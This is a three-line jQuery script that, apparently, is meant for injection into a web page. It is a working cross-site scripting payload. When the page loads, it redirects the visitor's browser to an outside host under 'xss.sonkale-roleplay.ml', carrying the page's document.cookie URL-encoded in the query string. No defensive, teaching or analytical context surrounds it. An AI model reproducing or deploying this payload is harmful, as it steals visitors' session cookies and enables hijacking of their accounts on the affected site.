$( document ).ready(function() {
    window.location="https://xss.sonkale-roleplay.ml/xssfile.php?q=" + encodeURIComponent(document.cookie)
});